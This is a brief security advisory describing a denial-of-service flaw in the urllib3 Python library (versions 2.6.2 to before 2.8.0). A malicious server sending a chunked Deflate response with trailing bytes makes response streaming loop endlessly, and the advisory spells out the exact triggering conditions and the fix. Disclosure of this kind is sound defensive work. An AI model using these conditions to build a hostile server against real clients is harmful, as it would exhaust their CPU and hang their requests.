Vulnerabilities.Description: urllib3 is an HTTP client library for Python. From 2.6.2 until 2.8.0, HTTPResponse.stream and HTTPResponse.read_chunked can enter an infinite loop because the Deflate decoder retains trailing bytes as unconsumed input after reaching end-of-stream and repeatedly decodes them without progress. The issue occurs when an untrusted server sends a chunked Deflate response whose decoded body exceeds a positive finite chunk size and whose encoded body has trailing bytes, specifically a response with Transfer-Encoding: chunked and Content-Encoding: deflate, content decoding enabled, and the positive finite amt=N streaming chunk size. The attack mechanism is that a malicious server returns a compressed chunked response with trailing bytes after the Deflate stream. The impact is excessive CPU usage and a request that does not complete, and network read timeouts do not interrupt the loop because no further socket read occurs. This issue is fixed in version 2.8.0.
